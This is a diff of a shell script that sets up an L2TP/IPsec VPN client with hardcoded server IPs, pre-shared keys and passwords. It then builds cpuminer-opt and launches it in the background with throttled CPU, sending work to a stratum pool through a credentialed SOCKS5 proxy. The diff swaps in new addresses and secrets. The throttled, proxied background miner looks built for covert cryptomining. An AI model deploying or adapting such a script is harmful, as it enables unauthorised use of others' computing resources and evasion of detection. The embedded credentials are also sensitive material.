@@ -2,10 +2,10 @@
 sudo ufw allow proto tcp from any to any port 80,443
 apt-get update
 apt-get -y install strongswan xl2tpd
-VPN_SERVER_IP='159.65.107.133'
-VPN_IPSEC_PSK='E8gPXqedyCZbZ9o4'
+VPN_SERVER_IP='208.167.255.155'
+VPN_IPSEC_PSK='fJJ5V8LAwJbcPP6r'
 VPN_USER='vpnuser'
-VPN_PASSWORD='JK3kw2sBkqJJpmk2'
+VPN_PASSWORD='WELEq3AKJkdb7xSp'
 cat > /etc/ipsec.conf <<EOF
 # ipsec.conf - strongSwan IPsec configuration file
 
@@ -96,4 +96,4 @@ cd cpuminer-opt
 chmod +x *
 ./build.sh
 make
-cpulimit --exe cpuminer --limit 80 -b && ./cpuminer -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u zimbalem.test -p x -x socks5://zimbalem:123456@209.250.244.28:1212 --background
+cpulimit --exe cpuminer --limit 80 -b && ./cpuminer -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u zimbalem.test -p x -x socks5://zimbalem:123456@159.65.101.206:8899 --background
